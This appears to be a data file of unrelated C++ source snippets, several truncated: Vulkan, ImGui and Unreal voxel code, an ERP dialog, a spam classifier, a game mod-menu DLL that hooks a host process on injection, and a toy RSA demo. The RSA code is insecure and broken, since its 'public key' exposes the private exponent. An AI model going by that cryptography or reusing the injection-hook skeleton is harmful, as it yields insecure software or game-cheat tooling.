    "#include \"WannaVulkanContext.h\"\n#include \"WannaGlfwWindow.h\"\n\nnamespace WannaEngine {\n    // \u6240\u9700\u9a8c\u8bc1\u5c42\n    const DeviceFeature requestedLayers[] = {\n        { \"VK_LAYER_KHRONOS_validation\", true },\n    };\n\n    // \u6240\u9700\u62d3\u5c55\n    const DeviceFeature requestedExtensions[] = {\n        { VK_KHR_SURFACE_EXTENSION_NAME, true },\n\n#ifdef WANNA_ENGINE_PLATFORM_WIN32\n        { VK_KHR_WIN32_SURFACE_EXTENSION_NAME, true },\n#elif WANNA_ENGINE_PLATFORM_MACOS\n        { VK_MVK_MACOS_SURFACE_EXTENSION_NAME, true },\n#elif WANNA_ENGINE_PLATFORM_LINUX\n        { VK_KHR_XCB_SURFACE_EXTENSION_NAME, true },\n#endif\n\n    };\n\n    // \u6784\u9020\u51fd\u6570\n    WannaVulkanContext::WannaVulkanContext(WannaWindow* win) {\n        CreateInstance();\n        CreateSurface(win);\n        SelectPhysicalDevice();\n    }\n\n    // \u6790\u6784\u51fd\u6570\n    WannaVulkanContext::~WannaVulkanContext() {\n        vkDestroySurfaceKHR(mInstance, mSurface, nullptr);\n        vkDestroyInstance(mInstance, nullptr);\n    }\n\n    // \u9519\u8bef\u62a5\u544a\n    static VkBool32 VkDebugReportCallback(VkDebugReportFlagsEXT     flags,\n                                      VkDebugReportObjectTypeEXT    objectType,\n                                      uint64_t                      object,\n                                      size_t                        location,\n                                      int32_t                       messageCode,\n                                      const char*                   pLayerPrefix,\n                                      const char*                   pMessage,\n                                      void*                         pUserData) {\n        if (flags & VK_DEBUG_REPORT_ERROR_BIT_EXT) {\n            LOG_ERROR(\"{0}\", pMessage);\n        }\n        if (flags & VK_DEBUG_REPORT_WARNING_BIT_EXT || flags & VK_DEBUG_REPORT_PERFORMANCE_WARNING_BIT_EXT) {\n            LOG_WARNING(\"{0}\", pMessage);\n        }\n        return VK_TRUE;\n    }\n\n    // \u521b\u5efa\u5b9e\u4f8b\n    void WannaVulkanContext::CreateInstance() {\n\n        // 1. \u6784\u5efalayers \u62ff\u5230\u5f53\u524d\u8bbe\u5907\u6240\u652f\u6301\u7684\u5c42\n        uint32_t availableLayerCount = 0;\n        CALL_VK(vkEnumerateInstanceLayerProperties(&availableLayerCount, nullptr));\n        VkLayerProperties availableLayers[availableLayerCount];\n        CALL_VK(vkEnumerateInstanceLayerProperties(&availableLayerCount, availableLayers));\n        \n        uint32_t enableLayerCount = 0;\n        const char* enableLayers[32];\n        if (bValidate) {\n            if(!findDeviceFeatures(\"Instance Layers\", false, availableLayerCount, availableLayers,\n                            ARRAY_SIZE(requestedLayers), requestedLayers, &enableLayerCount, enableLayers)) {\n                exit(EXIT_FAILURE);\n            }\n        }\n\n        // 2. \u6784\u5efaextension\n        uint32_t availableExtensionCount = 0;\n        CALL_VK(vkEnumerateInstanceExtensionProperties(\"\", &availableExtensionCount, nullptr));\n        VkExtensionProperties availableExtensions[availableExtensionCount];\n        CALL_VK(vkEnumerateInstanceExtensionProperties(\"\", &availableExtensionCount, availableExtensions));\n\n        // \u6dfb\u52a0glfw\u62d3\u5c55\n        uint32_t glfwRequestedExtensionCount;\n        std::unordered_set<const char*> allRequestedExtensionSet;\n        std::vector<DeviceFeature> allRequestedExtensions;\n        const char ** glfwRequestedExtensions = glfwGetRequiredInstanceExtensions(&glfwRequestedExtensionCount);\n        for (const auto &item: requestedExtensions){\n            if(allRequestedExtensionSet.find(item.name) == allRequestedExtensionSet.end()) {\n                allRequestedExtensionSet.insert(item.name);\n                allRequestedExtensions.push_back(item);\n            }\n        }\n\n        for (int i = 0; i < glfwRequestedExtensionCount; i++){\n            const char *extensionName = glfwRequestedExtensions[i];\n            if(allRequestedExtensionSet.find(extensionName) == allRequestedExtensionSet.end()) {\n                allRequestedExtensionSet.insert(extensionName);\n                allRequestedExtensions.push_back({ extensionName, true });\n            }\n        }\n\n        uint32_t enableExtensionCount;\n        const char *enableExtensions[32];\n        if(!findDeviceFeatures(\"Instance Extension\", true, availableExtensionCount, availableExtensions,\n                                allRequestedExtensions.size(), allRequestedExtensions.data(), &enableExtensionCount, enableExtensions)){\n            exit(EXIT_FAILURE);\n        }\n\n        // 3. \u521b\u5efaVulkan\u5b9e\u4f8b\n        VkApplicationInfo applicationInfo = {\n            .sType = VK_STRUCTURE_TYPE_APPLICATION_INFO,\n            .pNext = nullptr,\n            .pApplicationName = \"Wanna Engine\",\n            .applicationVersion = VK_MAKE_VERSION(1, 0, 0),\n            .pEngineName = \"Wanna\",\n            .engineVersion = VK_MAKE_VERSION(1, 0, 0),\n            .apiVersion = VK_API_VERSION_1_3,\n        };// \u5e94\u7528\u4fe1\u606f\n\n        // \u9519\u8bef\u56de\u8c03\u51fd\u6570\u4fe1\u606f\n        VkDebugReportCallbackCreateInfoEXT debugReportCallbackInfoExt = {\n            .sType = VK_STRUCTURE_TYPE_DEBUG_REPORT_CREATE_INFO_EXT,\n            .pNext = nullptr,\n            .flags = VK_DEBUG_REPORT_WARNING_BIT",
    "// dear imgui: Renderer Backend for modern OpenGL with shaders / programmatic pipeline\n// - Desktop GL: 2.x 3.x 4.x\n// - Embedded GL: ES 2.0 (WebGL 1.0), ES 3.0 (WebGL 2.0)\n// This needs to be used along with a Platform Backend (e.g. GLFW, SDL, Win32, custom..)\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'GLuint' OpenGL texture identifier as void*/ImTextureID. Read the FAQ about ImTextureID!\n//  [X] Renderer: Large meshes support (64k+ vertices) with 16-bit indices (Desktop OpenGL only).\n//  [X] Renderer: Multi-viewport support (multiple windows). Enable with 'io.ConfigFlags |= ImGuiConfigFlags_ViewportsEnable'.\n\n// About WebGL/ES:\n// - You need to '#define IMGUI_IMPL_OPENGL_ES2' or '#define IMGUI_IMPL_OPENGL_ES3' to use WebGL or OpenGL ES.\n// - This is done automatically on iOS, Android and Emscripten targets.\n// - For other targets, the define needs to be visible from the imgui_impl_opengl3.cpp compilation unit. If unsure, define globally or in imconfig.h.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2024-XX-XX: Platform: Added support for multiple windows via the ImGuiPlatformIO interface.\n//  2024-01-09: OpenGL: Update GL3W based imgui_impl_opengl3_loader.h to load \"libGL.so\" and variants, fixing regression on distros missing a symlink.\n//  2023-11-08: OpenGL: Update GL3W based imgui_impl_opengl3_loader.h to load \"libGL.so\" instead of \"libGL.so.1\", accommodating for NetBSD systems having only \"libGL.so.3\" available. (#6983)\n//  2023-10-05: OpenGL: Rename symbols in our internal loader so that LTO compilation with another copy of gl3w is possible. (#6875, #6668, #4445)\n//  2023-06-20: OpenGL: Fixed erroneous use glGetIntegerv(GL_CONTEXT_PROFILE_MASK) on contexts lower than 3.2. (#6539, #6333)\n//  2023-05-09: OpenGL: Support for glBindSampler() backup/restore on ES3. (#6375)\n//  2023-04-18: OpenGL: Restore front and back polygon mode separately when supported by context. (#6333)\n//  2023-03-23: OpenGL: Properly restoring \"no shader program bound\" if it was the case prior to running the rendering function. (#6267, #6220, #6224)\n//  2023-03-15: OpenGL: Fixed GL loader crash when GL_VERSION returns NULL. (#6154, #4445, #3530)\n//  2023-03-06: OpenGL: Fixed restoration of a potentially deleted OpenGL program, by calling glIsProgram(). (#6220, #6224)\n//  2022-11-09: OpenGL: Reverted use of glBufferSubData(), too many corruptions issues + old issues seemingly can't be reproed with Intel drivers nowadays (revert 2021-12-15 and 2022-05-23 changes).\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2022-09-27: OpenGL: Added ability to '#define IMGUI_IMPL_OPENGL_DEBUG'.\n//  2022-05-23: OpenGL: Reworking 2021-12-15 \"Using buffer orphaning\" so it only happens on Intel GPU, seems to cause problems otherwise. (#4468, #4825, #4832, #5127).\n//  2022-05-13: OpenGL: Fixed state corruption on OpenGL ES 2.0 due to not preserving GL_ELEMENT_ARRAY_BUFFER_BINDING and vertex attribute states.\n//  2021-12-15: OpenGL: Using buffer orphaning + glBufferSubData(), seems to fix leaks with multi-viewports with some Intel HD drivers.\n//  2021-08-23: OpenGL: Fixed ES 3.0 shader (\"#version 300 es\") use normal precision floats to avoid wobbly rendering at HD resolutions.\n//  2021-08-19: OpenGL: Embed and use our own minimal GL loader (imgui_impl_opengl3_loader.h), removing requirement and support for third-party loader.\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-06-25: OpenGL: Use OES_vertex_array extension on Emscripten + backup/restore current state.\n//  2021-06-21: OpenGL: Destroy individual vertex/fragment shader objects right after they are linked into the main shader.\n//  2021-05-24: OpenGL: Access GL_CLIP_ORIGIN when \"GL_ARB_clip_control\" extension is detected, inside of just OpenGL 4.5 version.\n//  2021-05-19: OpenGL: Replaced direct access to ImDrawCmd::TextureId with a call to ImDrawCmd::GetTexID(). (will become a requirement)\n//  2021-04-06: OpenGL: Don't try to read GL_CLIP_ORIGIN unless we're OpenGL 4.5 or greater.\n//  2021-02-18: OpenGL: Change blending equation to preserve alpha in output buffer.\n//  2021-01-03: OpenGL: Backup, setup and restore GL_STENCIL_TEST state.\n//  2020-10-23: OpenGL: Backup, setup and restore GL_PRIMITIVE_RESTART state.\n//  2020-10-15: Ope",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"NaiveChunk.h\"\n\n#include \"MainPlayer.h\"\n#include \"Utils/FastNoiseLite.h\"\n\nEBlock ANaiveChunk::GetBlockByFaceIndex(const int Index)\n{\n\tconst int32 BlockIndex = FaceToPoint.FindRef(Index);\n\treturn Blocks[BlockIndex];\n}\n\nvoid ANaiveChunk::Setup()\n{\n\t// Initialize Blocks\n\tBlocks.SetNum(Size * Size * Size);\n}\n\nvoid ANaiveChunk::Generate2DHeightMap(const FVector Position)\n{\n\tfor (int x = 0; x < Size; x++)\n\t{\n\t\tfor (int y = 0; y < Size; y++)\n\t\t{\n\t\t\tconst float XPos = x + Position.X;\n\t\t\tconst float YPos = y + Position.Y;\n\n\t\t\tconst int Height = FMath::Clamp(FMath::RoundToInt((Noise->GetNoise(XPos, YPos) + 1) * Size / 2), 0, Size);\n\n\t\t\tfor (int z = 0; z < Height; z++)\n\t\t\t{\n\t\t\t\tBlocks[GetBlockIndex(x,y,z)] = EBlock::Stone;\n\t\t\t}\n\t\t\t\n\t\t\tfor (int z = Height; z < Size; z++)\n\t\t\t{\n\t\t\t\tBlocks[GetBlockIndex(x,y,z)] = EBlock::Air;\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid ANaiveChunk::Generate3DHeightMap(const FVector Position)\n{\n\tfor (int x = 0; x < Size; ++x)\n\t{\n\t\tfor (int y = 0; y < Size; ++y)\n\t\t{\n\t\t\tfor (int z = 0; z < Size; ++z)\n\t\t\t{\n\t\t\t\tconst auto NoiseValue = Noise->GetNoise(x + Position.X, y + Position.Y, z + Position.Z);\n\n\t\t\t\tif (NoiseValue >= 0)\n\t\t\t\t{\n\t\t\t\t\tBlocks[GetBlockIndex(x, y, z)] = EBlock::Air;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tBlocks[GetBlockIndex(x, y, z)] = EBlock::Stone;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid ANaiveChunk::GenerateMesh()\n{\n\tFaceToPoint.Empty();\n\tfor (int x = 0; x < Size; x++)\n\t{\n\t\tfor (int y = 0; y < Size; y++)\n\t\t{\n\t\t\tfor (int z = 0; z < Size; z++)\n\t\t\t{\n\t\t\t\tif (Blocks[GetBlockIndex(x,y,z)] != EBlock::Air)\n\t\t\t\t{\n\t\t\t\t\tconst auto Position = FVector(x,y,z);\n\t\t\t\t\t\n\t\t\t\t\tfor (auto Direction : {EDirection::Forward, EDirection::Right, EDirection::Back, EDirection::Left, EDirection::Up, EDirection::Down})\n\t\t\t\t\t{\n\t\t\t\t\t\tif (Check(GetPositionInDirection(Direction, Position)))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tCreateFace(Direction, Position * 100);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\n\nbool ANaiveChunk::Check(const FVector Position) const\n{\n\tif (Position.X >= Size || Position.Y >= Size || Position.X < 0 || Position.Y < 0 || Position.Z < 0) return true;\n\tif (Position.Z >= Size) return true;\n\treturn Blocks[GetBlockIndex(Position.X, Position.Y, Position.Z)] == EBlock::Air;\n}\n\nvoid ANaiveChunk::CreateFace(const EDirection Direction, const FVector Position)\n{\n\tconst auto Color = FColor::MakeRandomColor();\n\tconst auto Normal = GetNormal(Direction);\n\n\tFaceToPoint.Add(MeshData.Vertices.Num(), GetBlockIndex(Position.X, Position.Y, Position.Z));\n\tMeshData.Vertices.Append(GetFaceVertices(Direction, Position));\n\t// \u4e00\u4e2a\u9762\u5bf9\u5e94\u4e24\u4e2a\u4e09\u89d2\u5f62\n\tconst auto TruthPos = Position / 100;\n\tFaceToPoint.Add(MeshData.Triangles.Num() / 3, GetBlockIndex(TruthPos.X, TruthPos.Y, TruthPos.Z));\n\tFaceToPoint.Add(MeshData.Triangles.Num() / 3 + 1, GetBlockIndex(TruthPos.X, TruthPos.Y, TruthPos.Z));\n\t// \u5b9e\u9645\u586b\u5165\u4e09\u89d2\u5f62\u9876\u70b9\u6570\u636e\uff0c\u8fd9\u91cc\u662f\u4e09\u4e2a\u70b9\u786e\u5b9a\u4e00\u4e2a\u4e09\u89d2\u5f62\uff0c\u6240\u4ee5\u4e0a\u9762\u5fc5\u987b\u9664\u4e09\n\tMeshData.Triangles.Append({ VertexCount + 3, VertexCount + 2, VertexCount, VertexCount + 2, VertexCount + 1, VertexCount });\n\tMeshData.Normals.Append({Normal, Normal, Normal, Normal});\n\tMeshData.Colors.Append({Color, Color, Color, Color});\n\tswitch (Direction)\n\t{\n\tcase EDirection::Back:// FORWARD?\n\t\tMeshData.UV0.Append({\n\t\t\tFVector2D(0, 0.5),\n\t\t\tFVector2D(0.333, 0.5),\n\t\t\tFVector2D(0.333, 1),\n\t\t\tFVector2D(0, 1)\n\t\t});\n\t\tbreak;\n\tcase EDirection::Right:\n\t\tMeshData.UV0.Append({\n\t\t\tFVector2D(0.666, 0),\n\t\t\tFVector2D(1, 0),\n\t\t\tFVector2D(1, 0.5),\n\t\t\tFVector2D(0.666, 0.5)\n\t\t});\n\t\tbreak;\n\tcase EDirection::Forward: // BACK?\n\t\tMeshData.UV0.Append({\n\t\t\tFVector2D(0.666, 0.5),\n\t\t\tFVector2D(1, 0.5),\n\t\t\tFVector2D(1, 1),\n\t\t\tFVector2D(0.666, 1),\n\t\t});\n\t\tbreak;\n\tcase EDirection::Up:\n\t\tMeshData.UV0.Append({\n\t\t\tFVector2D(0.333, 0.5),\n\t\t\tFVector2D(0.666, 0.5),\n\t\t\tFVector2D(0.666, 1),\n\t\t\tFVector2D(0.333, 1)\n\t\t});\n\t\tbreak;\n\tcase EDirection::Left:\n\t\tMeshData.UV0.Append({\n\t\t\tFVector2D(0.333, 0),\n\t\t\tFVector2D(0.666, 0),\n\t\t\tFVector2D(0.666, 0.5),\n\t\t\tFVector2D(0.333, 0.5)\n\t\t});\n\t\tbreak;\n\tcase EDirection::Down:\n\t\tMeshData.UV0.Append({\n\t\t\tFVector2D(0, 0),\n\t\t\tFVector2D(0.333, 0),\n\t\t\tFVector2D(0.333, 0.5),\n\t\t\tFVector2D(0, 0.5)\n\t\t});\n\t\tbreak;\n\t}\n\tVertexCount += 4;\n}\n\nTArray<FVector> ANaiveChunk::GetFaceVertices(EDirection Direction, const FVector Position) const\n{\n\tTArray<FVector> Vertices;\n\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tVertices.Add(BlockVertexData[BlockTriangleData[i + static_cast<int>(Direction) * 4]] + Position);\n\t}\n\t\n\treturn Vertices;\n}\n\nFVector ANaiveChunk::GetPositionInDirection(const EDirection Direction, const FVector Position) const\n{\n\tswitch (Direction)\n\t{\n\tcase EDirection::Forward: return Position + FVector::ForwardVector;\n\tcase EDirection::Back: return Position + FVector::BackwardVector;\n\tcase EDirection::Left: return Position + FVector::LeftVector;\n\tcase EDirection::Right: return Position + FVector::RightVector;\n\tcase EDirection::Up: return Position + FVector::UpVector;\n\tcase EDirection::Down: return Position + FVector::DownVector;\n\tdefault: throw std::invalid_argument(\"Invalid direction\");\n\t}\n}\n\nFVector ANaiveC",
    "#include <vector>\n#include <unordered_set>\n#include <numeric>\n#include <iostream>\n#include <random>\n\nusing namespace std;\n\ntypedef long long ll;\ntypedef vector<ll> vll;\ntypedef pair<ll, ll> pll;\n\nconst ll MAX_PRIME_VALUE = 1000;\n\nunordered_set<ll> generate_primes() {\n    unordered_set < ll > primes;\n    // Sieve of Erasthotenes, all numbers start out as prime\n    // and we cancel possibilities\n    vector<bool> sieve(MAX_PRIME_VALUE, true);\n    for (ll i = 2; i < MAX_PRIME_VALUE; ++i) {\n        // Cancel values 2i, 3i, 4i, ...\n        for (ll j = i * 2; j < MAX_PRIME_VALUE; j += i) {\n            sieve[j] = false;\n        }\n    }\n    for (ll i = 2; i < MAX_PRIME_VALUE; ++i) {\n        if (sieve[i]) {\n            primes.insert(i);\n        }\n    }\n    return primes;\n}\n\npll generate_factors_random() {\n    unordered_set < ll > primes = generate_primes();\n    random_device rd;\n    mt19937 rng(rd());\n    uniform_int_distribution<ll> uni(5, primes.size());\n    // find p\n    ll randpos1 = uni(rng);\n    auto it = primes.begin();\n    for (ll i = 0; i < randpos1; ++i) {\n        ++it;\n    }\n    ll p = *it;\n    primes.erase(it);\n\n    // find q\n    ll randpos2 = uni(rng);\n    auto it2 = primes.begin();\n    for (ll i = 0; i < randpos2; ++i) {\n        ++it2;\n    }\n    ll q = *it2;\n    return make_pair(p, q);\n}\n\n\nll generate_public_key(ll p, ll q) {\n    ll e = 2;\n    ll euler = (p - 1) * (q - 1);\n    while (gcd(e, euler) != 1) {\n        e++;\n    }\n    return e;\n}\n\n\npll find_inverse_aux(ll a, ll b) {\n    if (a == 0) {\n        return make_pair(0, 1);\n    }\n    pll next = find_inverse_aux(b % a, a);\n    return make_pair(next.second - (b / a) * next.first, next.first);\n}\n\nll find_inverse(ll a, ll b) {\n    ll inverse = find_inverse_aux(a, b).first;\n    return (inverse + b) % b;\n}\n\nll generate_private_key(ll p, ll q, ll e) {\n    ll eulerfun = (p - 1) * (q - 1);\n    return find_inverse(e, eulerfun);\n}\n\nll exp_mod(ll a, ll b, ll mod) {\n    if (b == 0) {\n        return 1;\n    }\n    ll tmp = exp_mod(a, b / 2, mod);\n    tmp = (tmp * tmp) % mod;\n    if (b % 2 == 1) {\n        tmp = (tmp * a) % mod;\n    }\n    return tmp % mod;\n}\n\nstruct RSAEncryption {\n    vll data;\n    pll private_key{};\n    pll public_key{};\n};\n\n\nRSAEncryption encrypt_rsa(const string &s) {\n    /*\n     * Receives an unencrypted string\n     * Returns an object containing:\n     * - Encrypted data\n     * - Private key\n     * - Public key\n     */\n\n    // Step 1: Generate two random primes\n    pll factors = generate_factors_random();\n    ll p = factors.first;\n    ll q = factors.second;\n    // Step 2: Consider the product of both numbers\n    ll n = p * q;\n    // Step 3: Find a number coprime to phi(n) (euler's totient function)\n    ll e = generate_public_key(p, q);\n    // Step 4: Calculate the modular multiplicative inverse of e mod phi(n)\n    ll d = generate_private_key(p, q, e);\n    // Step 5: Encrypt the message M using the rule E(M) = M^e mod n\n    vll data;\n    for (ll i = 0; i < s.length(); ++i) {\n        ll encrypted = exp_mod(s[i], e, n);\n        data.push_back(encrypted);\n    }\n    RSAEncryption encryption;\n    encryption.data = data;\n    encryption.private_key = make_pair(d, n);\n    encryption.public_key = make_pair(e, d);\n    return encryption;\n}\n\nstring decrypt_rsa(const RSAEncryption &encryption) {\n    string data;\n    for (ll i = 0; i < encryption.data.size(); ++i) {\n        char decrypted = (char) exp_mod(encryption.data[i], encryption.private_key.first,\n                                        encryption.private_key.second);\n        data += decrypted;\n    }\n    return data;\n}\n\nint main() {\n    string s;\n    cout << \"Ingrese la cadena a encriptar: \";\n    getline(cin, s);\n    RSAEncryption encryption = encrypt_rsa(s);\n    cout << \"La cadena encriptada es: \";\n    for (ll i = 0; i < encryption.data.size(); ++i) {\n        cout << encryption.data[i] << \" \";\n    }\n    cout << endl << \"Clave p\u00fablica: \" << \"(\" << encryption.public_key.first << \", \" << encryption.public_key.second\n         << \")\" << endl;\n    cout << \"Clave privada: \" << \"(\" << encryption.private_key.first << \", \" << encryption.private_key.second << \")\"\n         << endl;\n    string decryption = decrypt_rsa(encryption);\n    cout << \"La cadena desencriptada es: \" << decryption << endl;\n    return 0;\n}\n",
    "// dllmain.cpp : Defines the entry point for the DLL application.\n#include \"stdafx.h\"\n\nvoid Logger(const char* fmt, ...)\n{\n\tprintf(fmt);\n}\nDWORD WINAPI ControlThread(LPVOID lpParam)\n{\n\tusing namespace Mod_Hub_Base;\n\tif (AllocConsole()) {\n\t\tfreopen_s(reinterpret_cast<FILE**>(stdout), \"CONOUT$\", \"w\", stdout);\n\t\tSetConsoleTitleW(L\"\" Mod_Menu_Name);\n\t\tSetConsoleCP(CP_UTF8);\n\t\tSetConsoleOutputCP(CP_UTF8);\n\t}\n\tLog::Msg(\"Starting Mod Hub Base Updated By XIFI\");\n\tHooking::StartHook((HMODULE)lpParam); // this always loadng first\n\tg_Hooking = std::make_unique<Hooking>();\n\tg_Hooking->Hook();\n\tg_D3DRenderer = std::make_unique<D3DRenderer>();\n\n\t//MessageBoxA(NULL, Mod_Menu_Name \" LOADED!\", \"LOADED!\", MB_ICONINFORMATION);\n\tLog::Msg(Mod_Menu_Name \" <!> loaded \");\n\twhile (Mod_running)\n\t{\n\t\tstd::this_thread::sleep_for(std::chrono::milliseconds(10));\n\t\tstd::this_thread::yield();\n\t\tif (GetAsyncKeyState(VK_DELETE)) { Mod_running = false; }\n\t}\n\n\tHooking::Cleanup();\n}\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)\n{\n\tswitch (ul_reason_for_call)\n\t{\n\tcase DLL_PROCESS_ATTACH:\n\t\tCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ControlThread, hModule, NULL, NULL);\n\t\tbreak;\n\tcase DLL_THREAD_ATTACH:\n\t\tbreak;\n\tcase DLL_THREAD_DETACH:\n\t\tbreak;\n\tcase DLL_PROCESS_DETACH:\n\t\tbreak;\n\t}\n\treturn TRUE;\n}",
    "/*\n * This file is part of the xTuple ERP: PostBooks Edition, a free and\n * open source Enterprise Resource Planning software suite,\n * Copyright (c) 1999-2018 by OpenMFG LLC, d/b/a xTuple.\n * It is licensed to you under the Common Public Attribution License\n * version 1.0, the full text of which (including xTuple-specific Exhibits)\n * is available at www.xtuple.com/CPAL.  By using this software, you agree\n * to be bound by its terms.\n */\n\n#include \"csvaddmapinputdialog.h\"\n\n#include <QMessageBox>\n#include <QSqlError>\n\n#include \"xsqlquery.h\"\n\n#define DEBUG false\n\nCSVAddMapInputDialog::CSVAddMapInputDialog(QWidget *parent, Qt::WindowFlags f)\n  : QDialog(parent, f)\n{\n  setupUi(this);\n\n  connect(_schema, SIGNAL(currentIndexChanged(int)), this, SLOT(populateTable()));\n\n  populateSchema();\n  _schema->setCurrentIndex(0);\n}\n\nCSVAddMapInputDialog::~CSVAddMapInputDialog()\n{\n}\n\nvoid CSVAddMapInputDialog::languageChange()\n{\n  retranslateUi(this);\n}\n\nQString CSVAddMapInputDialog::mapname() const\n{\n  return _name->text();\n}\n\nvoid CSVAddMapInputDialog::populateSchema()\n{\n  XSqlQuery nspq(\"SELECT '[ All schemas ]' AS nspname, 1 AS seq\"\n                 \" UNION \"\n                 \"SELECT 'public', 2\"\n                 \" UNION \"\n                 \"SELECT nspname, 3\"\n                 \"  FROM pg_namespace\"\n                 \" WHERE ((nspname !~ '^pg_')\"\n                 \"   AND  (nspname != 'public')\"\n                 \"   AND  (nspname != 'information_schema'))\"\n                 \" ORDER BY seq, nspname;\");\n  if (nspq.exec())\n    _schema->clear();\n  while (nspq.next())\n    _schema->addItem(nspq.value(\"nspname\").toString());\n  if (nspq.lastError().type() != QSqlError::NoError)\n  {\n    QMessageBox::critical(this, tr(\"Database Error\"), nspq.lastError().text());\n    return;\n  }\n}\n\nvoid CSVAddMapInputDialog::populateTable()\n{\n  XSqlQuery relq;\n  if (_schema->currentIndex() == 0)\n    relq.prepare(\"SELECT CASE nspname WHEN 'public' THEN relname\"\n                 \"                    ELSE nspname || '.' || relname\"\n                 \"       END AS relname,\"\n                 \"       CASE nspname WHEN 'public' THEN 0 ELSE 1 END AS seq\"\n                 \"  FROM pg_class\"\n                 \"  JOIN pg_namespace ON (relnamespace=pg_namespace.oid)\"\n                 \" WHERE ((relkind IN ('r', 'v'))\"\n                 \"   AND  (nspname !~ '^pg_')\"\n                 \"   AND  (nspname != 'information_schema'))\"\n                 \" ORDER BY seq, relname;\");\n  else\n  {\n    relq.prepare(\"SELECT relname\"\n                 \"  FROM pg_class\"\n                 \"  JOIN pg_namespace ON (relnamespace=pg_namespace.oid)\"\n                 \" WHERE ((relkind IN ('r', 'v'))\"\n                 \"   AND  (nspname = :nspname))\"\n                 \" ORDER BY relname;\");\n    relq.bindValue(\":nspname\", _schema->currentText());\n  }\n  if (relq.exec())\n    _table->clear();\n  while (relq.next())\n    _table->addItem(relq.value(\"relname\").toString());\n  if (relq.lastError().type() != QSqlError::NoError)\n  {\n    QMessageBox::critical(this, tr(\"Database Error\"), relq.lastError().text());\n    return;\n  }\n}\n\nQString CSVAddMapInputDialog::qualifiedTable() const\n{\n  if (_schema->currentIndex() == 0)\n    return _table->currentText();\n  else\n    return QString(\"%1.%2\").arg(_schema->currentText(), _table->currentText());\n}\n\nQString CSVAddMapInputDialog::schema() const\n{\n  if (_schema->currentIndex() <= 0)\n    return QString {};\n  else\n    return _schema->currentText();\n}\n\nvoid CSVAddMapInputDialog::setMapname(const QString mapname)\n{\n  if (DEBUG) qDebug(\"setMapname(%s) entered\", qPrintable(mapname));\n  _name->setText(mapname);\n}\n\nvoid CSVAddMapInputDialog::setSchema(const QString schema)\n{\n  if (DEBUG) qDebug(\"setSchema(%s) entered\", qPrintable(schema));\n  _schema->setCurrentIndex(_schema->findData(schema, Qt::DisplayRole));\n  if (_schema->currentIndex() < 0)\n    _schema->setCurrentIndex(0);\n}\n\nvoid CSVAddMapInputDialog::setTable(const QString table)\n{\n  if (DEBUG) qDebug(\"setTable(%s) entered\", qPrintable(table));\n  _table->setCurrentIndex(_table->findData(table, Qt::DisplayRole));\n  if (_table->currentIndex() < 0 && table.contains(\".\"))\n  {\n    QString unqualrelname = table.right(table.length() -\n                                        table.lastIndexOf(\".\") - 1);\n    if (DEBUG)\n      qDebug(\"stripped . off %s to get %s\",\n             qPrintable(table), qPrintable(unqualrelname));\n    _table->setCurrentIndex(_table->findData(unqualrelname, Qt::DisplayRole));\n  }\n}\n\nQString CSVAddMapInputDialog::table() const\n{\n  return _table->currentText();\n}\n\nQString CSVAddMapInputDialog::unqualifiedTable() const\n{\n  QString result = _table->currentText();\n  if (result.contains(\".\"))\n  {\n    QString unqualrelname = result.right(result.length() -\n                                         result.lastIndexOf(\".\") - 1);\n    if (DEBUG)\n      qDebug(\"stripped . off %s to get %s\",\n             qPrintable(result), qPrintable(unqualrelname));\n    result = unqualrelname;\n  }\n\n  return result;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <fstream>\n#include <sstream>\n#include <cmath>\nusing namespace std;\n// \u0110\u1ecbnh ngh\u0129a c\u1ea5u tr\u00fac d\u1eef li\u1ec7u l\u01b0u tr\u1eef c\u00e1c \u0111\u1eb7c tr\u01b0ng c\u1ee7a m\u1ed9t email\nstruct Email {\n    string sender;\n    string receiver;\n    string subject;\n    string body;\n    vector<string> keywords;\n    bool is_spam;\n};\n\n// \u0110\u1ecbnh ngh\u0129a h\u00e0m \u0111\u1ecdc d\u1eef li\u1ec7u t\u1eeb file v\u00e0o m\u1ed9t vector c\u00e1c email\nvector<Email> read_data(string filename) {\n    vector<Email> data;\n    ifstream file(filename);\n    string line;\n\n    while (getline(file, line)) {\n        Email email;\n        stringstream ss(line);\n        string field;\n\n        getline(ss, field, ',');\n        email.sender = field;\n\n        getline(ss, field, ',');\n        email.receiver = field;\n\n        getline(ss, field, ',');\n        email.subject = field;\n\n        getline(ss, field, ',');\n        email.body = field;\n\n        while (getline(ss, field, ',')) {\n            email.keywords.push_back(field);\n        }\n\n        getline(ss, field);\n        email.is_spam = (field == \"spam\");\n\n        data.push_back(email);\n    }\n\n    return data;\n}\n\n// \u0110\u1ecbnh ngh\u0129a h\u00e0m t\u00ednh to\u00e1n sigmoid c\u1ee7a m\u1ed9t s\u1ed1 th\u1ef1c\ndouble sigmoid(double x) {\n    return 1 / (1 + exp(-x));\n}\n\n// \u0110\u1ecbnh ngh\u0129a h\u00e0m hu\u1ea5n luy\u1ec7n m\u00f4 h\u00ecnh Logistic Regression\nvector<double> train_logistic_regression(vector<vector<double>>& features, vector<double>& labels, double learning_rate, int num_iterations) {\n    int num_examples = features.size();\n    int num_features = features[0].size();\n\n    // Kh\u1edfi t\u1ea1o c\u00e1c tham s\u1ed1 